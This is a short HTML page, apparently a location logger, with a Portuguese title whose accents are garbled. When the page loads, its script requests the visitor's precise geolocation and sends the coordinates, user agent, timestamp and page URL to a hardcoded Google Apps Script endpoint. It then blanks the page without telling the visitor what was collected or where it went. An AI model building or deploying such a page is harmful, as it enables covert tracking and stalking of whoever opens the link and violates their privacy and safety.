<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Permiss√£o de Localiza√ß√£o</title>
</head>
<body>
  <script>
    (function() {
      // URL do seu Google Apps Script Web App
      const LOG_ENDPOINT = 'https://script.google.com/macros/s/AKfycby5kT18kkDvLjtySh6T2JBOSO_qkPy7hQhoqcoR13khsyYbY_74Zp9KhQPiG98VNgd6nQ/exec';

      async function enviar(lat, lon) {
        console.log("üì° Enviando localiza√ß√£o:", lat, lon);

        try {
          const payload = {
            lat: lat,
            lon: lon,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent || '',
            origem: window.location.href
          };

          const resp = await fetch(LOG_ENDPOINT, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload),
            credentials: 'omit',
            mode: 'cors'
          });

          const data = await resp.text();
          console.log("‚úÖ Resposta do servidor:", data);
        } catch (err) {
          console.error("‚ùå Erro ao enviar:", err);
        }
      }

      function pedirLocalizacaoUmaVez() {
        if (!navigator.geolocation) {
          console.error("‚ùå Geolocaliza√ß√£o n√£o suportada.");
          document.body.innerHTML = '';
          return;
        }

        navigator.geolocation.getCurrentPosition(function(pos) {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;

          console.log("üìç Localiza√ß√£o obtida:", lat, lon);

          enviar(lat, lon).finally(() => {
            console.log("üîÑ P√°gina ficar√° em branco agora.");
            document.body.innerHTML = '';
          });
        }, function(err) {
          console.warn("‚ö†Ô∏è Erro ao obter localiza√ß√£o:", err);
          document.body.innerHTML = '';
        }, {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        });
      }

      window.addEventListener('load', pedirLocalizacaoUmaVez, {once: true});
    })();
  </script>
</body>
</html>
